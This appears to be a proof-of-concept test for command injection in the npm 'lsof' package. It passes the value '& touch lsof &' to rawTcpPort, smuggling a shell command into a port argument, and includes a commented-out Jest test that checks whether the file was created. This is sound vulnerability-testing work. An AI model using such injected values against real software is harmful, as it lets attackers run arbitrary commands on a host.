const root = require("lsof");
let attack_code = "& touch lsof &";
root.rawTcpPort(attack_code, function () {
  // file_exist = fs.existsSync(path);
  // expect(file_exist).toBe(true);
  // fs.unlink(path, function (err) {
  //   done();
  // });
});

// const { doesNotMatch } = require("assert");
// test("Command Injection in lsof", (done) => {
//   expect.assertions(2);
//   const root = require("lsof");
//   const fs = require("fs");
//   const path = "./lsof";
//   try {
//     if (fs.existsSync(path)) {
//       fs.unlinkSync(path);
//       console.log("File removed:", path);
//     }
//   } catch (err) {
//     console.error(err);
//   }
//   file_exist = fs.existsSync(path);
//   expect(file_exist).toBe(false);
//   let attack_code = "& touch lsof &";
//   root.rawTcpPort(attack_code, function () {
//     file_exist = fs.existsSync(path);
//     expect(file_exist).toBe(true);
//     fs.unlink(path, function (err) {
//       done();
//     });
//   });
// });
